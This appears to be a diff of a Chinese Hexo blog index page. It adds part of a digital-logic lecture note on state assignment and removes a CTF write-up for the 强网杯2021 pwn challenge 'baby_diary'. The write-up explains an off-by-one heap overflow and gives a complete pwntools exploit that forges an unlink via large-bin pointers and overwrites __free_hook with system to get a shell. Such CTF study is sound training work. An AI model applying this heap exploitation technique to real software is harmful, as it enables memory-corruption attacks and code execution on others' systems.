+<p>最小化状态表中用字母或数字表示的状态，指定一个二进制代码，形成二进制状态表。方法：相邻分配法。<br />
+以下情况分配相邻状态码，优先级依次降低：</p>
+<ol>
+<li>次态相同，为现态分配相邻状态码</li>
+<li>同一现态，为次态分配相邻状态码</li>
+<li>输出相同，为现态分配相邻状态码</li>
+</ol>
+<h2 id="534-确定激励函数和输出函数并画出逻辑电路图"><a class="markdownIt-Anchor" href="#534-确定激励函数和输出函数并画出逻辑电路图"></a> 5.3.4 确定激励函数和输出函数并画出逻辑电路图</h2>
+<p>列出激励函数与输出函数真值表<br />
+使用卡诺图化简后写出最简表达式<br />
+<img src="2.png" alt="" /><br />
+<img src="3.png" alt="" /></p>
+<h2 id="535-注意的问题"><a class="markdownIt-Anchor" href="#535-注意的问题"></a> 5.3.5 注意的问题</h2>
+<ol>
+<li>电路是否能够自恢复。设计电路的最佳状态时电路正常状态下不会到达无效状态，其次是万一进入无效状态后能够在输入信号和脉冲作用下自动进入有效状态，后者称为“自恢复”，否则称为“挂起”。电路中包含多个无效状态时往往将无效状态构成的集合称为状态的无效序列，正常的状态称为有效序列。</li>
+<li>电路是否会产生错误输出。处于无效状态时，是否会在输入信号和时钟脉冲作用下产生错误输出信号。<br />
+若存在“挂起”和错误输出，则需要进行设计修正。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-4%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1727,129 +1918,10 @@ show与edit相同，也是只能展示前30字节。</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/" class="post-title-link" itemprop="url">强网杯2021 pwn 赛题解析——baby_diary</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-28 23:01:56" itemprop="dateCreated datePublished" datetime="2023-02-28T23:01:56+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-01 11:31:36" itemprop="dateModified" datetime="2023-03-01T11:31:36+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>4.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>4 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这是一道经典的堆题，可以写入、读取和删除。其中最值得研究的就是write函数最后调用的一个函数，其中涉及几个迷之计算。</p>
-<h1 id="step-1-漏洞分析"><a class="markdownIt-Anchor" href="#step-1-漏洞分析"></a> Step 1: 漏洞分析</h1>
-<p><img src="1.png" alt="" /><br />
-我们进入unknown_handle函数（名字是笔者自己起的）：<br />
-<img src="2.png" alt="" /><br />
-后面有一个unknown_cal函数，这个函数对输入的字符串进行了一系列的操作。首先将各个字符取出将它们的ASCII码全加起来保存到一个变量a中，然后循环进行下面的计算：如果a大于0xF，计算<code>a = (a &gt;&gt; 4) + (a &amp; 0xF)</code>直到a小于0xF为止。返回到unknown_handle函数中，这里对字符串的后面一位进行了修改。但write函数一开始会要求输入size，申请的空间大小是size+1，这就需要注意read_buf这个函数了。当循环退出的时候，i的值应该就是max_len，此时后面的<code>buf[i]=0</code>实际上已经相对于max_len溢出了一个字节。因此unknown_handle函数中最后一条语句实际上相对于size溢出了2个字节。这可能会修改到下一个chunk的size。<br />
-<img src="3.png" alt="" /><br />
-<img src="4.png" alt="" /></p>
-<p>本题还存在数组溢出漏洞。</p>
-<p>请注意read函数，其中并没有对index进行检查，而在check_terminator函数中，存在有整型溢出漏洞，当index为负数时有可能通过检查。<br />
-<img src="5.png" alt="" /><br />
-<img src="6.png" alt="" /><br />
-但在数组溢出之后，想让check_terminator函数返回true并不容易，需要匹配结束符的ASCII码。</p>
-<p>同样地，delete函数中也存在整型溢出漏洞，但如果对应地址不是有效的堆地址，就会直接报错，因此这里也不好利用：<br />
-<img src="7.png" alt="" /></p>
-<h1 id="step-2-确定利用方式调试编写exp"><a class="markdownIt-Anchor" href="#step-2-确定利用方式调试编写exp"></a> Step 2: 确定利用方式，调试编写exp</h1>
-<p>这里需要注意unknown_handle函数时如何溢出一个字节的。在最后一条语句中，unknown_handle函数只会修改这个溢出字节的最低4位，最高4位不变。而堆管理中正常情况下所有的堆块大小都是以整0x10的形式保存的，即所有堆块的大小都是0x10的倍数。因此仅仅依靠一个字节的溢出无法达到堆块重叠的目的。</p>
-<p>这里参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/eeeeeight/article/details/118006138?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=baby%20diary&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-118006138.142%5Ev33%5Econtrol,185%5Ev2%5Econtrol&amp;spm=1018.2226.3001.4187">这篇文章</a>的思路，利用large bin进行中转。当large bin中只有一个chunk时，其四个指针fd、bk、fd_nextsize、bk_nextsize有fd=bk在main_arena，fd_nextsize=bk_nextsize就是chunk自身。<br />
-<img src="8.png" alt="" /><br />
-当我们再一次分配到这一块内存空间时，我们就可以对这里面残留的4个指针进行改写，将其伪造成一个假chunk，这个chunk的fd指针就是原来的fd_nextsize指针，bk指针就是原来的bk_nextsize指针，将原来的bk指针改为合适的size，准备进行unlink操作。unlink操作最为关键的就是假chunk中两个指针的值，fd需要等于假chunk-0x18，bk需要等于假chunk-0x10。前面说过当large bin中仅有一个chunk时，其fd_nextsize和bk_nextsize均指向其自身，因此这里的<font color=red>bk不需要修改，但fd需要修改。</font><strong>注意：这里需要一定的爆破：由于写入时会在后面加上零字节和标志位，因此需要爆破chunk地址的其中8位，成功率为1/256：</strong><br />
-<img src="9.png" alt="" /><br />
-在爆破成功之后，我们就通过unlink实现了堆块重叠，申请合适的大小就可以使得main_arena的地址可以被其他chunk所读取。</p>
-<p>在获取libc地址后，我们还是利用堆块重叠这一特性，修改tcache的指向到__free_hook，将其改为system地址。然后释放堆块即可。</p>
-<p><strong><font color=red>需要注意的是：假chunk头部应该写的是假chunk的地址而不应该是其他值，因为unlink_chunk函数中那个<code>fd-&gt;bk=p || bk-&gt;fd=p</code>这个检查中p是一个指针。因此我们还需要想办法让这里的值变成假chunk的地址</font></strong>。前面说过，我们通过切割large bin chunk可以获得两个地址，然后我们要改写其中一个地址。改写之后我们再一次释放这个chunk，这时这个chunk会进入到<strong>fastbin</strong>中，这就有可能会在假chunk头部写上一个有效的地址。我们只需要将这个chunk重新分配回来，修改这个地址，就有可能满足unlink的检查条件。（<font color=red>注意：不能让chunk进入tcache的原因是tcache chunk的bk指针实际指向tcache那个结构体，因此会破坏假chunk的结构，覆盖我们写入的size值，导致unlink在检查size时就失败</font>）</p>
-<p>另外，对于最初进入large bin的chunk的大小也有讲究。在第一次写假chunk信息时，我们需要写入一个size的值，而这个size的值会影响到最后的校验位。如果size的值设置得不正确，那么第一次写入和第二次写入计算出来的校验位就会不一样，这样是不可能利用成功的。因为第一次写入影响的是假chunk的fd指针，第二次写入影响的是假chunk地址本身，二者的校验位必须相等才可能使得unlink的检查通过。经过验证，这里的假chunk的size可以写0x800，但是不能写0x700、0x600等值。</p>
-<p>exp如下，平均需要爆破约350次，这和爆破的期望不符，原因暂时不明。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_diary</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    write_diary(<span class="number">0x1070</span> - <span class="number">0x290</span> - <span class="number">0x10</span> + <span class="number">0x4000</span>, <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #0</span></span><br><span class="line">    write_diary(<span class="number">0x810</span> - <span class="number">0x30</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>)                 <span class="comment"># chunk #1</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                                <span class="comment"># chunk #2</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)</span><br><span class="line">    write_diary(<span class="number">0x800</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #1, previous chunk #1 to large bin</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, p64(<span class="number">0x10</span>) + p64(<span class="number">0x800</span>) + <span class="string">b&#x27;\x68\n&#x27;</span>)   <span class="comment"># chunk #3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #4~6</span></span><br><span class="line">    write_diary(<span class="number">0x6B0</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #8~10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># chunk #11~17</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_diary(<span class="number">11</span>+i)                                  <span class="comment"># to tcache</span></span><br><span class="line"></span><br><span class="line">    delete_diary(<span class="number">4</span>)</span><br><span class="line">    delete_diary(<span class="number">3</span>)                                         <span class="comment"># write the chunk_addr to fake chunk&#x27;s header</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># empty tcache, chunk #3, #4, #11~15</span></span><br><span class="line"></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\x80\n&#x27;</span>)                            <span class="comment"># chunk #16, change the chunk address</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x27</span>)                       <span class="comment"># chunk #2, change the prev_inuse bit of chunk #1</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">8</span>) + <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #2, change the prev_size of chunk #2 to 0x500</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)                                         <span class="comment"># trigger unlink</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        write_diary(<span class="number">0x40</span>, <span class="string">b&#x27;deadbeef\n&#x27;</span>)                    <span class="comment"># chunk #1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(counter)</span><br><span class="line"></span><br><span class="line">read_diary(<span class="number">5</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">__malloc_hook = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__free_hook))</span><br><span class="line"></span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line">delete_diary(<span class="number">6</span>)</span><br><span class="line">write_diary(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="10.png" alt="" /></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1915,7 +1987,7 @@ show与edit相同，也是只能展示前30字节。</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1967,13 +2039,13 @@ show与edit相同，也是只能展示前30字节。</p>
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">1.2m</span>
+    <span title="Symbols count total">1.3m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">18:50</span>
+    <span title="Reading time total">18:57</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
